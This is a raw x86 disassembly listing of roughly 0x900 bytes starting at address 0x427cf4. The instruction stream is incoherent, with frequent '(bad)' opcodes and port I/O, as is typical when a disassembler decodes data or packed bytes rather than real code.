  427cf4:	jmp    0xd6d1:0xe9c2d3db
  427cfb:	(bad)  
  427cfd:	repz jmp 0xd705:0xf0b9c8d8
  427d05:	not    esi
  427d07:	rcr    esi,1
  427d09:	(bad)  
  427d0a:	(bad)  
  427d0c:	jmp    0xd1436405
  427d11:	jmp    0x427cbc
  427d13:	mov    bl,0xe3
  427d15:	scas   al,BYTE PTR es:[edi]
  427d16:	fcmovbe st,st(4)
  427d18:	jmp    0xf50e6514
  427d1d:	rcl    ecx,cl
  427d1f:	iret   
  427d20:	fsubp  st(4),st
  427d22:	cmc    
  427d23:	xlat   BYTE PTR ds:[ebx]
  427d24:	lock push es
  427d26:	loop   0x427d0d
  427d28:	cld    
  427d29:	add    edx,ebp
  427d2b:	mov    DWORD PTR [ecx],0xdeebd3e2
  427d31:	fsubr  st(2),st
  427d33:	shr    esp,cl
  427d35:	fcmovnb st,st(2)
  427d37:	leave  
  427d38:	icebp  
  427d39:	enter  0xc6d2,0xcc
  427d3d:	stc    
  427d3e:	fdivr  DWORD PTR [edx+eax*8-0x2a4bf931]
  427d45:	rol    DWORD PTR [edx],cl
  427d47:	out    0xbf,al
  427d49:	(bad)  
  427d4a:	fsubr  st,st(5)
  427d4c:	int    0xc4
  427d4e:	fist   WORD PTR [edx]
  427d50:	shr    ebp,1
  427d52:	loopne 0x427d2b
  427d54:	call   0xca0e6c1e
  427d59:	clc    
  427d5a:	retf   
  427d5b:	mov    bh,0xf5
  427d5d:	mov    esp,0x2fee8ce
  427d62:	mov    esi,0xf8d7fcf5
  427d67:	mov    eax,0x4c808e3
  427d6c:	fmul   st(7),st
  427d6e:	or     al,0xf3
  427d70:	fsubr  st,st(6)
  427d72:	retf   
  427d73:	repz repz int3 
  427d76:	retf   
  427d77:	jmp    0xea025754
  427d7c:	std    
  427d7d:	aad    0xd7
  427d7f:	div    dh
  427d81:	aad    0xce
  427d83:	std    
  427d84:	add    ah,ch
  427d86:	cmc    
  427d87:	sti    
  427d88:	ret    
  427d89:	fsubr  st(4),st
  427d8b:	fmul   st(7),st
  427d8d:	retf   0xfae0
  427d90:	lock in al,0xb0
  427d93:	out    0xdc,eax
  427d95:	aad    0xb6
  427d97:	shr    bh,cl
  427d99:	call   0xf62e3c84
  427d9e:	mov    ecx,0xeddad401
  427da3:	neg    eax
  427da5:	rol    bh,cl
  427da7:	cmc    
  427da8:	(bad)
  427dab:	call   0x1179b3
  427db0:	(bad)
  427db3:	mov    eax,0xd7fad0e2
  427db9:	stc    
  427dba:	leave  
  427dbb:	iret   
  427dbc:	shl    dl,1
  427dbe:	add    bh,bh
  427dc0:	int3   
  427dc1:	shl    DWORD PTR [ebp-0x6233204],1
  427dc7:	or     ecx,esp
  427dc9:	(bad)  
  427dca:	(bad)  
  427dcc:	retf   0x2c2
  427dcf:	int3   
  427dd0:	ret    0xb0e0
  427dd3:	repnz rcl edx,cl
  427dd6:	int    0xcd
  427dd8:	retf   0xdff3
  427ddb:	mov    al,0xf8
  427ddd:	mov    dh,0xd3
  427ddf:	(bad)  
  427de1:	(bad)  
  427de3:	fdiv   st(4),st
  427de5:	clc    
  427de6:	or     edi,DWORD PTR [edx+ebp*8-0x3629f7fa]
  427ded:	fdivr  st(2),st
  427def:	stc    
  427df0:	jmp    0xc6212ce8
  427df5:	int    0xc8
  427df7:	les    edi,FWORD PTR [edx-0x12123150]
  427dfd:	fbstp  TBYTE PTR [ecx-0x21e040e]
  427e03:	(bad)  
  427e04:	(bad)  
  427e05:	sar    ebp,cl
  427e07:	xlat   BYTE PTR ds:[ebx]
  427e08:	test   DWORD PTR [edi],0xc804c906
  427e0e:	stc    
  427e0f:	repz fdivr QWORD PTR [eax-0x1c2b3a2a]
  427e16:	sar    DWORD PTR [edx-0x261b350d],1
  427e1c:	(bad)  
  427e1d:	fidiv  WORD PTR [ecx-0x3d370534]
  427e23:	ror    esp,1
  427e25:	add    BYTE PTR [ebx],al
  427e27:	icebp  
  427e28:	aad    0xc2
  427e2a:	add    eax,esp
  427e2c:	or     bh,ch
  427e2e:	add    al,BYTE PTR [ecx]
  427e30:	mov    bl,0xd0
  427e32:	in     eax,dx
  427e33:	fdivr  QWORD PTR [ebp-0x171f2415]
  427e39:	leave  
  427e3a:	jmp    0xd6d7:0xfdfcced6
  427e41:	ror    bh,cl
  427e43:	hlt    
  427e44:	ret    0xe0ec
  427e47:	add    al,al
  427e49:	sar    ecx,0xcb
  427e4c:	fmulp  st(1),st
  427e4e:	repnz out 0xc4,eax
  427e51:	out    0xde,eax
  427e53:	int    0xd3
  427e55:	fucomi st,st(3)
  427e57:	mov    al,0xc6
  427e59:	fcomi  st,st(7)
  427e5b:	out    dx,eax
  427e5c:	aam    0xf3
  427e5e:	rcl    bh,cl
  427e60:	in     eax,dx
  427e61:	mov    ecx,0xdaeddebf
  427e66:	aad    0xe7
  427e68:	test   esp,0xfa0ce707
  427e6e:	retf   0xe9ed
  427e71:	mov    esi,0xd2c6eaec
  427e76:	test   eax,0xf9f8caf4
  427e7b:	in     al,dx
  427e7c:	aad    0xf0
  427e7e:	(bad)  
  427e7f:	mov    esp,0x1f9f400
  427e84:	xlat   BYTE PTR ds:[ebx]
  427e85:	les    eax,FWORD PTR [eax]
  427e87:	mov    esp,0xee8c7db
  427e8c:	enter  0xf3c6,0xcc
  427e90:	lods   al,BYTE PTR ds:[esi]
  427e91:	in     al,0xd6
  427e93:	shl    DWORD PTR [edx-0x90c1e31],cl
  427e99:	(bad)  
  427e9a:	(bad)  
  427e9c:	fcmovnu st,st(6)
  427e9e:	mov    esi,0xf0fff0cf
  427ea3:	cmc    
  427ea4:	(bad)
  427ea7:	add    al,0xe7
  427ea9:	std    
  427eaa:	aad    0xdb
  427eac:	loope  0x427e76
  427eae:	fxch   st(5)
  427eb0:	out    0xd2,eax
  427eb2:	test   al,0xdc
  427eb4:	jmp    0xd3144c9e
  427eb9:	lock (bad) 
  427ebb:	out    dx,eax
  427ebc:	(bad)  
  427ebd:	clc    
  427ebe:	icebp  
  427ebf:	repnz (bad) 
  427ec2:	mov    esi,0xc1c207d0
  427ec7:	in     eax,0xfd
  427ec9:	out    0xc4,eax
  427ecb:	psubw  mm3,mm2
  427ece:	(bad)  
  427ed0:	icebp  
  427ed1:	out    dx,al
  427ed2:	ret    
  427ed3:	retf   0xe7d2
  427ed6:	cli    
  427ed7:	enter  0xb2b3,0xee
  427edb:	aad    0xff
  427edd:	int    0xbf
  427edf:	jecxz  0x427ebc
  427ee1:	mov    ecx,0xd4d9f500
  427ee6:	ror    BYTE PTR [edx],1
  427ee8:	stc    
  427ee9:	lds    edi,FWORD PTR [ebp+0x9e0eb08]
  427eef:	jecxz  0x427ec2
  427ef1:	int3   
  427ef2:	icebp  
  427ef3:	into   
  427ef4:	repz repnz int 0xf0
  427ef8:	call   0xcf0e71d4
  427efd:	retf   0x1b1
  427f00:	icebp  
  427f01:	ror    edi,0xc0
  427f04:	ret    
  427f05:	in     eax,0x1
  427f07:	jecxz  0x427ecf
  427f09:	call   0x91f4ef2
  427f0e:	adc    al,BYTE PTR [eax]
  427f10:	(bad)  
  427f11:	out    0xc8,al
  427f13:	ret    
  427f14:	ret    0xcee8
  427f17:	repz (bad) 
  427f19:	mov    eax,0xb9efffbf
  427f1e:	stc    
  427f1f:	retf   0xd7ba
  427f22:	pop    es
  427f23:	loopne 0x427f23
  427f25:	std    
  427f26:	add    dh,bl
  427f28:	(bad)  
  427f29:	out    dx,eax
  427f2a:	xlat   BYTE PTR ds:[ebx]
  427f2b:	add    ah,ah
  427f2d:	jmp    0x427f35
  427f2f:	cld    
  427f30:	mov    cl,0xcc
  427f32:	sar    BYTE PTR [esi-0x454a2b16],1
  427f38:	in     al,dx
  427f39:	mov    cl,0xef
  427f3b:	clc    
  427f3c:	hlt    
  427f3d:	enter  0xeee3,0xe0
  427f41:	rcl    ecx,0xd8
  427f44:	in     al,dx
  427f45:	out    0xc5,eax
  427f47:	(bad)  
  427f49:	add    BYTE PTR [ecx],al
  427f4b:	add    bl,dh
  427f4d:	out    0xb,al
  427f4f:	loopne 0x427f12
  427f51:	rcr    ah,1
  427f53:	(bad)
  427f56:	(bad)  
  427f57:	div    BYTE PTR [ebx-0x47410d4f]
  427f5d:	fcmovu st,st(3)
  427f5f:	mov    ecx,0xc1f0cefb
  427f64:	mov    esi,0xbd60b07
  427f69:	ror    cl,1
  427f6b:	bswap  ebp
  427f6d:	push   cs
  427f6e:	fcmovu st,st(6)
  427f70:	iret   
  427f71:	(bad)
  427f74:	in     eax,0xe6
  427f76:	int    0xcd
  427f78:	idiv   al
  427f7a:	int3   
  427f7b:	mov    ecx,0xcceabbce
  427f80:	add    bh,ch
  427f82:	add    edi,edi
  427f84:	add    ebp,esi
  427f86:	(bad)  
  427f88:	add    eax,0xcfe6fff9
  427f8d:	repz std 
  427f8f:	icebp  
  427f90:	mov    ecx,0xc2c3d6b1
  427f95:	shr    cl,1
  427f97:	mov    edx,0xf9c7f5d6
  427f9c:	fdivr  st(4),st
  427f9e:	jmp    0xfbf6:0xd6f401f6
  427fa5:	sti    
  427fa6:	or     eax,DWORD PTR [ecx+eiz*8]
  427fa9:	jmp    0xdd0c:0xaddeee6
  427fb0:	call   0xcae74282
  427fb5:	into   
  427fb6:	cmc    
  427fb7:	ret    0xb5b9
  427fba:	lock jmp 0xcfd2:0xd1d4d9b5
  427fc2:	int3   
  427fc3:	add    eax,0xbd9d104
  427fc8:	or     bh,bl
  427fca:	(bad)  
  427fcb:	loopne 0x427fc9
  427fcd:	or     cl,cl
  427fcf:	in     al,dx
  427fd0:	in     eax,0xcd
  427fd2:	(bad)  
  427fd3:	mov    al,0xdc
  427fd5:	ret    
  427fd6:	hlt    
  427fd7:	ror    esp,cl
  427fd9:	mov    dl,0xcf
  427fdb:	(bad)  
  427fdc:	(bad)  
  427fdd:	cld    
  427fde:	imul   dl
  427fe0:	fild   WORD PTR [ecx]
  427fe2:	fidivr DWORD PTR [ebp-0x1a2a2004]
  427fe8:	call   0xc73f8bd7
  427fed:	(bad)  
  427fee:	cld    
  427fef:	fdiv   st,st(3)
  427ff1:	ret    0xb2d2
  427ff4:	jmp    0x427fc6
  427ff6:	leave  
  427ff7:	mov    ch,0xb4
  427ff9:	out    dx,eax
  427ffa:	aad    0xf6
  427ffc:	mov    ch,0xfa
  427ffe:	sar    BYTE PTR [edi-0x123e3225],cl
  428004:	fdiv   st,st(2)
  428006:	lock fsubp st(3),st
  428009:	ror    BYTE PTR [ebx],1
  42800b:	loope  0x427ff3
  42800d:	enter  0x7cc,0xce
  428011:	int3   
  428012:	mov    esi,0xb2b0ebb0
  428017:	mov    dh,0xd4
  428019:	jmp    0xfaf5:0xf9b9d1db
  428020:	rcr    edi,0xed
  428023:	faddp  st(2),st
  428025:	fst    st(3)
  428027:	jecxz  0x428011
  428029:	hlt    
  42802a:	(bad)  
  42802c:	jmp    0xeeb3:0xdcf108e2
  428033:	in     eax,0xc8
  428035:	in     eax,0xdb
  428037:	test   al,0xcf
  428039:	into   
  42803a:	out    0xed,al
  42803c:	call   0xfd416c25
  428041:	in     eax,dx
  428042:	repnz fsubrp st(4),st
  428045:	jecxz  0x428048
  428047:	stc    
  428048:	aam    0x6
  42804a:	add    al,ah
  42804c:	or     eax,0xe304d8ce
  428051:	test   eax,0xc6b2ded3
  428056:	mov    bh,0xb1
  428058:	mov    ebx,0xcfd6f8df
  42805d:	retf   0xefeb
  428060:	mov    ebx,0xd7cce3f9
  428065:	sar    dh,0xf6
  428068:	(bad)  
  428069:	aam    0xd6
  42806b:	in     eax,0xdc
  42806d:	push   cs
  42806e:	dec    al
  428070:	rol    ebp,cl
  428072:	mov    bl,0xe9
  428074:	out    0xd7,eax
  428076:	lock mov bh,0xee
  42807a:	in     eax,dx
  42807b:	(bad)
  42807e:	sti    
  42807f:	mov    ebx,0xbdf7f2be
  428084:	repnz hlt 
  428086:	ret    
  428087:	fcomp  st(7)
  428089:	cli    
  42808a:	enter  0xe4e4,0xcf
  42808e:	or     bh,ah
  428090:	mov    ecx,0xadd5b2dc
  428095:	enter  0xa8e6,0xf2
  428099:	mov    cl,0xd2
  42809b:	enter  0xd6ee,0xe2
  42809f:	fldln2 
  4280a1:	iret   
  4280a2:	clc    
  4280a3:	rcr    edi,cl
  4280a5:	fcmovnu st,st(3)
  4280a7:	aad    0xfc
  4280a9:	clc    
  4280aa:	loope  0x4280a9
  4280ac:	fucomi st,st(5)
  4280ae:	fst    QWORD PTR [ebx]
  4280b0:	jecxz  0x428090
  4280b2:	out    0xe4,al
  4280b4:	mov    ch,0xd3
  4280b6:	rcl    cl,0xd8
  4280b9:	scas   al,BYTE PTR es:[edi]
  4280ba:	(bad)  
  4280bc:	leave  
  4280bd:	lock into 
  4280bf:	mov    edx,0xf7e6d5f6
  4280c4:	lock (bad) 
  4280c6:	ret    
  4280c7:	icebp  
  4280c8:	in     eax,0xe4
  4280ca:	loop   0x4280cb
  4280cc:	or     esi,esp
  4280ce:	std    
  4280cf:	(bad)  
  4280d0:	iret   
  4280d1:	mov    ebp,0xb5e8a8cc
  4280d6:	mov    ebx,0xedcfb1d1
  4280db:	(bad)  
  4280dc:	neg    ah
  4280de:	mov    edx,0xe3b9f3d9
  4280e3:	fiadd  DWORD PTR [eax]
  4280e5:	lock ret 
  4280e7:	cmc    
  4280e8:	add    ecx,ebp
  4280ea:	or     al,bl
  4280ec:	fdivr  st,st(0)
  4280ee:	retf   0xb3ea
  4280f1:	mov    cl,0xe9
  4280f3:	in     al,dx
  4280f4:	(bad)  
  4280f5:	loope  0x4280d1
  4280f7:	mov    bh,0xe1
  4280f9:	out    dx,eax
  4280fa:	fdiv   st,st(5)
  4280fc:	mov    ch,0xb5
  4280fe:	out    dx,al
  4280ff:	aam    0xbc
  428101:	loop   0x4280d6
  428103:	ret    0xd5df
  428106:	xlat   BYTE PTR ds:[ebx]
  428107:	add    edx,eax
  428109:	(bad)  
  42810a:	loop   0x42811a
  42810c:	loopne 0x428114
  42810e:	cli    
  42810f:	retf   
  428110:	retf   
  428111:	mov    al,0xbf
  428113:	lock out 0xb2,eax
  428116:	shr    esp,1
  428118:	mov    bl,0xd3
  42811a:	jmp    0xea2b350d
  42811f:	mov    al,0xf2
  428121:	hlt    
  428122:	mov    ch,0xd7
  428124:	mov    esi,0xf4f1d5dd
  428129:	or     al,BYTE PTR [edi+ebp*8]
  42812c:	out    0xec,eax
  42812e:	jecxz  0x428129
  428130:	in     eax,0xe6
  428132:	(bad)  
  428133:	int3   
  428134:	shl    esp,cl
  428136:	ret    0xc6fb
  428139:	inc    edi
  42813b:	out    dx,al
  42813c:	cli    
  42813d:	fcmove st,st(6)
  42813f:	aad    0xd1
  428141:	call   0xff305325
  428146:	or     bl,ah
  428148:	add    ebx,ecx
  42814a:	out    dx,eax
  42814b:	loopne 0x428159
  42814d:	push   es
  42814e:	sti    
  42814f:	or     edx,ecx
  428151:	out    dx,eax
  428152:	xlat   BYTE PTR ds:[ebx]
  428153:	in     al,0xb5
  428155:	repz div DWORD PTR [eax-0x32493230]
  42815c:	in     eax,0xd8
  42815e:	icebp  
  42815f:	frndint 
  428161:	mov    esi,0xfde6f5d1
  428166:	rol    BYTE PTR [eax*8-0x17013a1a],cl
  42816d:	jmp    0x428149
  42816f:	loop   0x42811b
  428171:	out    0xe8,al
  428173:	jecxz  0x42813c
  428175:	out    0xcd,al
  428177:	int    0xfb
  428179:	in     al,0xd1
  42817b:	ror    ebp,cl
  42817d:	rcl    bl,cl
  42817f:	cmc    
  428180:	fmul   st,st(5)
  428182:	out    0xd0,eax
  428184:	idiv   ebx
  428186:	loope  0x428166
  428188:	aad    0xc9
  42818a:	out    dx,al
  42818b:	loopne 0x428172
  42818d:	(bad)  [edi]
  42818f:	repnz scas al,BYTE PTR es:[edi]
  428191:	test   eax,0xc7eebcec
  428196:	leave  
  428197:	shr    bh,0xba
  42819a:	(bad)  
  42819c:	repnz shr edi,cl
  42819f:	int3   
  4281a0:	fdivp  st(7),st
  4281a2:	pop    es
  4281a3:	aam    0xe7
  4281a5:	vpaddusb ymm4,ymm0,ymm7
  4281a9:	enter  0xd5c4,0xe3
  4281ad:	repz add ch,cl
  4281b0:	lods   eax,DWORD PTR ds:[esi]
  4281b1:	call   0xdd2b2f62
  4281b6:	hlt    
  4281b7:	jmp    0x428182
  4281b9:	mov    dl,0xde
  4281bb:	mov    eax,0xc9e8fcf2
  4281c0:	(bad)  
  4281c1:	mov    esi,0xddd3f5d0
  4281c6:	test   ecx,0xd6e8efdc
  4281cc:	into   
  4281cd:	in     eax,0x12
  4281cf:	adc    ch,dl
  4281d1:	loope  0x4281a2
  4281d3:	(bad)
  4281d6:	loope  0x4281a8
  4281d8:	mov    bl,0xe5
  4281da:	int3   
  4281db:	rcl    esp,1
  4281dd:	retf   0xeaec
  4281e0:	mov    bh,0x2
  4281e2:	fbstp  TBYTE PTR [ebp+eiz*8-0x38fb2119]
  4281e9:	or     ebp,esi
  4281eb:	add    al,0xc8
  4281ed:	push   cs
  4281ee:	out    0xe0,al
  4281f0:	test   al,0xae
  4281f2:	lods   eax,DWORD PTR ds:[esi]
  4281f3:	faddp  st(3),st
  4281f5:	shr    DWORD PTR [ecx-0xd2c303f],0xea
  4281fc:	retf   
  4281fd:	cli    
  4281fe:	mov    eax,0xf4d3fabd
  428203:	lock dec BYTE PTR [ebx]
  428206:	idiv   bl
  428208:	add    ecx,ebx
  42820a:	or     ah,ch
  42820c:	in     al,0xde
  42820e:	enter  0xc9ff,0xac
  428212:	mov    cl,0xca
  428214:	iret   
  428215:	mov    ah,0xef
  428217:	iret   
  428218:	stc    
  428219:	in     al,0xd2
  42821b:	in     eax,dx
  42821c:	cld    
  42821d:	mov    dh,0xdf
  42821f:	fdivr  QWORD PTR [ebp-0x44411344]
  428225:	repz jmp 0xc5e3:0xc106e0d0
  42822d:	fucomip st,st(3)
  42822f:	clc    
  428230:	shl    edi,0xdf
  428233:	loope  0x4281f8
  428235:	jecxz  0x42822c
  428237:	shr    dl,1
  428239:	in     al,dx
  42823a:	xlat   BYTE PTR ds:[ebx]
  42823b:	in     eax,dx
  42823c:	clc    
  42823d:	mov    ebp,0xb9f6fade
  428242:	test   ebx,0xd7d4f7fa
  428248:	add    al,0xe9
  42824a:	(bad)  
  42824c:	in     al,dx
  42824d:	clc    
  42824e:	or     DWORD PTR [ebx],ecx
  428250:	mov    ecx,0xf7ccc0cf
  428255:	out    0xe5,eax
  428257:	out    0xe4,al
  428259:	repz icebp 
  42825b:	fstp   st(1)
  42825d:	fcmovnb st,st(3)
  42825f:	leave  
  428260:	mov    esp,0xe7ecd1dc
  428265:	loopne 0x428228
  428267:	rcr    al,cl
  428269:	mul    ecx
  42826b:	pmaxub mm1,QWORD PTR [eax+ecx*8]
  42826f:	retf   
  428270:	loop   0x428261
  428272:	in     eax,0xc5
  428274:	call   0xb12e455a
  428279:	jmp    0xb8d9:0xedcfc5ee
  428280:	ret    0xd902
  428283:	out    dx,al
  428284:	mov    ebx,0xe1bcbdfe
  428289:	in     eax,0xea
  42828b:	pminub mm1,QWORD PTR [eax]
  42828e:	add    ecx,esi
  428290:	scas   al,BYTE PTR es:[edi]
  428291:	mov    eax,0xb1b2d1e0
  428296:	rol    bh,cl
  428298:	mov    dh,0xd6
  42829a:	div    esp
  42829c:	fcmovnbe st,st(0)
  42829e:	cli    
  42829f:	mov    esp,0xf7cdbdd2
  4282a4:	mov    esi,0xf7d2b9c0
  4282a9:	cmc    
  4282aa:	xlat   BYTE PTR ds:[ebx]
  4282ab:	lsl    ebx,cx
  4282ae:	jmp    0x428289
  4282b0:	(bad)  
  4282b1:	out    dx,al
  4282b2:	mov    edi,0xd4c0e3ce
  4282b7:	not    ebx
  4282b9:	jmp    0x4282a4
  4282bb:	mov    ch,0xf2
  4282bd:	sti    
  4282be:	mov    eax,0xcfb9cdce
  4282c3:	shl    edi,0xf0
  4282c6:	rcl    cl,0xd9
  4282c9:	push   es
  4282ca:	out    0xe1,eax
  4282cc:	stc    
  4282cd:	in     al,0xdb
  4282cf:	loopne 0x4282ae
  4282d1:	out    dx,eax
  4282d2:	fsub   QWORD PTR [edx+eiz*8-0x342b382f]
  4282d9:	retf   
  4282da:	int    0xb8
  4282dc:	stc    
  4282dd:	mov    ch,0xbb
  4282df:	ret    
  4282e0:	call   0xd13a55b9
  4282e5:	cld    
  4282e6:	or     ah,ah
  4282e8:	or     ebp,eax
  4282ea:	idiv   eax
  4282ec:	or     ecx,DWORD PTR [ebx]
  4282ee:	jmp    0xf7276fe4
  4282f3:	out    0xd6,eax
  4282f5:	(bad)
  4282f8:	call   0xd4014dea
  4282fd:	sar    BYTE PTR [ecx-0x1024fe32],1
  428303:	(bad)  
  428305:	aam    0x5
  428307:	add    esi,eax
  428309:	out    dx,eax
  42830a:	paddw  mm7,mm6
  42830d:	(bad)  
  42830e:	cli    
  42830f:	out    dx,al
  428310:	stos   DWORD PTR es:[edi],eax
  428311:	jmp    0xee186cc9
  428316:	loop   0x4282c9
  428318:	aad    0xd4
  42831a:	(bad)  
  42831b:	out    0xb4,al
  42831d:	retf   
  42831e:	mov    ecx,0xbf02ccde
  428323:	rcr    bh,0xf4
  428326:	add    al,0xda
  428328:	add    eax,0xdbc7fdeb
  42832d:	cli    
  42832e:	jecxz  0x42831f
  428330:	shl    BYTE PTR [ecx-0x231b333c],1
  428336:	mov    cl,0xb3
  428338:	int3   
  428339:	iret   
  42833a:	out    dx,eax
  42833b:	fnstsw WORD PTR [eax-0x232a44fd]
  428341:	jecxz  0x42832f
  428343:	in     eax,dx
  428344:	aad    0xd8
  428346:	cli    
  428347:	ret    0xe402
  42834a:	out    dx,al
  42834b:	(bad)  
  42834d:	leave  
  42834e:	or     DWORD PTR [ecx],ecx
  428350:	fucom  st(6)
  428352:	vpsrld xmm2,xmm3,xmm2
  428356:	retf   
  428357:	(bad)  
  428358:	mov    dl,0xc5
  42835a:	fmul   st,st(3)
  42835c:	fcomip st,st(6)
  42835e:	hlt    
  42835f:	loope  0x42831b
  428361:	(bad)  
  428363:	shl    bl,1
  428365:	loope  0x42834a
  428367:	fucomi st,st(1)
  428369:	in     al,0xd8
  42836b:	add    al,0xfd
  42836d:	hlt    
  42836e:	or     al,0xf
  428370:	out    0xcc,eax
  428372:	jmp    0xe7bb:0xd3d2f5bc
  428379:	in     al,dx
  42837a:	mov    al,0xde
  42837c:	fcmove st,st(1)
  42837e:	ret    
  42837f:	mov    ebx,0xf5cce2d4
  428384:	ret    0xd306
  428387:	retf   
  428388:	cld    
  428389:	leave  
  42838a:	loop   0x42838c
  42838c:	add    edi,edi
  42838e:	jecxz  0x42836c
  428390:	iret   
  428391:	into   
  428392:	(bad)  
  428394:	mov    bl,0xc4
  428396:	retf   0xfacf
  428399:	mov    cl,0xd0
  42839b:	int3   
  42839c:	stc    
  42839d:	cld    
  42839e:	cli    
  42839f:	xlat   BYTE PTR ds:[ebx]
  4283a0:	ret    0xd4dd
  4283a3:	mov    esi,0xbe5ccfd
  4283a8:	out    0xe7,al
  4283aa:	add    esp,ebx
  4283ac:	leave  
  4283ad:	ret    0xecc
  4283b0:	int    0xf3
  4283b2:	test   eax,0xd7ead5de
  4283b7:	fcmovnu st,st(2)
  4283b9:	scas   al,BYTE PTR es:[edi]
  4283ba:	aam    0xdb
  4283bc:	int    0xdb
  4283be:	iret   
  4283bf:	xlat   BYTE PTR ds:[ebx]
  4283c0:	iret   
  4283c1:	cli    
  4283c2:	sar    DWORD PTR [ebp+eiz*8-0x212f3822],cl
  4283c9:	fild   WORD PTR [ebx]
  4283cb:	fsubp  st(2),st
  4283cd:	leave  
  4283ce:	enter  0xe509,0xc1
  4283d2:	mov    bh,0xad
  4283d4:	xlat   BYTE PTR ds:[ebx]
  4283d5:	imul   BYTE PTR [esp+eiz*8-0x94b062f]
  4283dc:	(bad)  
  4283dd:	in     eax,dx
  4283de:	int    0xd9
  4283e0:	hlt    
  4283e1:	add    eax,ebx
  4283e3:	loopne 0x4283a5
  4283e5:	int3   
  4283e6:	add    al,0x6
  4283e8:	stc    
  4283e9:	inc    DWORD PTR [edx]
  4283eb:	jecxz  0x4283e1
  4283ed:	or     esi,ebp
  4283ef:	rol    dh,0xaa
  4283f2:	faddp  st(5),st
  4283f4:	mov    al,0xef
  4283f6:	shr    DWORD PTR [eax-0x2f26244b],cl
  4283fc:	std    
  4283fd:	(bad)  
  4283fe:	xlat   BYTE PTR ds:[ebx]
  4283ff:	lock cld 
  428401:	int    0xff
  428403:	into   
  428404:	ret    
  428405:	mov    esp,0xdbc507d9
  42840a:	push   cs
  42840b:	out    dx,eax
  42840c:	iret   
  42840d:	leave  
  42840e:	(bad)  
  42840f:	in     al,dx
  428410:	test   eax,0xe1d1ceb2
  428415:	hlt    
  428416:	mul    cl
  428418:	out    dx,al
  428419:	xlat   BYTE PTR ds:[ebx]
  42841a:	repnz shr ah,1
  42841d:	enter  0xf5c8,0xd8
  428421:	pop    es
  428422:	rcr    bl,1
  428424:	xlat   BYTE PTR ds:[ebx]
  428425:	fucomi st,st(2)
  428427:	ret    0xd5f5
  42842a:	add    esi,eax
  42842c:	leave  
  42842d:	clc    
  42842e:	into   
  42842f:	fbld   TBYTE PTR [edi-0x1c3e3a2f]
  428435:	out    dx,eax
  428436:	out    0xfa,al
  428438:	icebp  
  428439:	test   esp,0xe8f8fff5
  42843f:	cli    
  428440:	out    dx,al
  428441:	out    dx,al
  428442:	loope  0x428422
  428444:	int3   
  428445:	add    al,0xe2
  428447:	push   es
  428448:	or     bh,bl
  42844a:	add    al,0xd4
  42844c:	or     eax,edi
  42844e:	or     ch,bl
  428450:	int3   
  428451:	faddp  st(4),st
  428453:	test   al,0xe5
  428455:	shl    ch,cl
  428457:	mov    al,0xe4
  428459:	out    0xe6,eax
  42845b:	cmc    
  42845c:	repz jmp 0xb9137959
  428462:	ror    ebp,1
  428464:	(bad)  
  428466:	mov    edi,0xf8e8fb06
  42846c:	jecxz  0x428456
  42846e:	leave  
  42846f:	add    eax,0xc5bfded8
  428474:	stos   DWORD PTR es:[edi],eax
  428475:	int3   
  428476:	aad    0xf2
  428478:	loope  0x42842a
  42847a:	repz fcomi st,st(1)
  42847d:	fdivr  DWORD PTR [ebp-0x3822430f]
  428483:	in     al,dx
  428484:	add    edi,edi
  428486:	loopne 0x42848c
  428488:	rol    DWORD PTR [edx],1
  42848a:	enter  0xc808,0xfb
  42848e:	int    0xea
  428490:	out    0xd0,eax
  428492:	mov    dl,0xd0
  428494:	repz in al,0xf5
  428497:	enter  0xb1c4,0xd2
  42849b:	repz fcomp st(5)
  42849e:	cli    
  42849f:	test   ch,0xdd
  4284a2:	mov    edi,0xeafdc207
  4284a7:	neg    eax
  4284a9:	fisttp WORD PTR [edi]
  4284ab:	cmc    
  4284ac:	or     esp,esp
  4284ae:	add    al,BYTE PTR [ebx]
  4284b0:	fdivr  QWORD PTR [ebp-0x1c4f384e]
  4284b6:	shl    cl,0xca
  4284b9:	jmp    0x428485
  4284bb:	mov    edx,0xddebbbdb
  4284c0:	sti    
  4284c1:	icebp  
  4284c2:	mov    ebp,0xc2e407f2
  4284c7:	std    
  4284c8:	mov    eax,0xeaeecbfb
  4284ce:	fsub   st(5),st
  4284d0:	mov    ecx,0xf4b3cda6
  4284d5:	jmp    0xcecb:0xc8d2b1c4
  4284dc:	sti    
  4284dd:	sti    
  4284de:	in     eax,dx
  4284df:	add    bh,bl
  4284e1:	int    0xf5
  4284e3:	mov    esp,0xfbc5beec
  4284e8:	inc    esp
  4284ea:	(bad)  
  4284eb:	jecxz  0x4284b6
  4284ed:	aam    0xcc
  4284ef:	add    ecx,esi
  4284f1:	jmp    0x42849b
  4284f3:	loope  0x4284a4
  4284f5:	in     al,dx
  4284f6:	rcl    eax,1
  4284f8:	mov    al,0xd8
  4284fb:	retf   0xf9f1
  4284fe:	out    dx,al
  4284ff:	hlt    
  428500:	mov    esi,0xbdf3d2d1
  428505:	div    al
  428507:	out    0x6,eax
  428509:	cli    
  42850a:	add    esp,esi
  42850c:	retf   0x90c
  42850f:	or     bl,al
  428511:	stos   BYTE PTR es:[edi],al
  428512:	(bad)  
  428513:	repz (bad) 
  428515:	ror    dl,cl
  428517:	mov    ah,0xeb
  428519:	(bad)  
  42851b:	aad    0xd5
  42851d:	aam    0xec
  42851f:	fdivr  QWORD PTR [ebp+esi*8-0xc1f2504]
  428526:	cli    
  428527:	add    eax,0xc500d700
  42852c:	or     bl,cl
  42852e:	add    al,0xec
  428530:	repz ret 
  428532:	(bad)  
  428534:	retf   0xe4eb
  428537:	in     al,dx
  428538:	clc    
  428539:	jmp    0xe90d7502
  42853e:	jmp    0xf4be:0xffdbf2f2
  428545:	repnz std 
  428547:	cmc    
  428548:	(bad)  
  42854a:	enter  0xdde1,0xc9
  42854e:	loopne 0x428538
  428550:	mov    edx,0xb0f3c0dc
  428556:	mov    ebx,0xe8b8c4c1
  42855b:	retf   
  42855c:	in     eax,0xd8
  42855e:	mov    ch,0xdd
  428560:	jecxz  0x428520
  428562:	in     al,dx
  428563:	mov    esi,0xf8d6fedf
  428568:	(bad)
  42856b:	dec    bh
  42856d:	cld    
  42856e:	in     eax,dx
  42856f:	in     al,0xe9
  428571:	div    eax
  428573:	retf   
  428574:	mov    al,0xf7
  428576:	test   eax,0xeebbe0cd
  42857b:	cmc    
  42857c:	(bad)  
  42857d:	not    ebp
  42857f:	loope  0x428552
  428581:	sti    
  428582:	loope  0x428544
  428584:	inc    DWORD PTR [ebx+ecx*1]
  428587:	or     eax,edi
  428589:	fmulp  st(1),st
  42858b:	out    dx,al
  42858c:	pop    es
  42858d:	in     eax,0x3
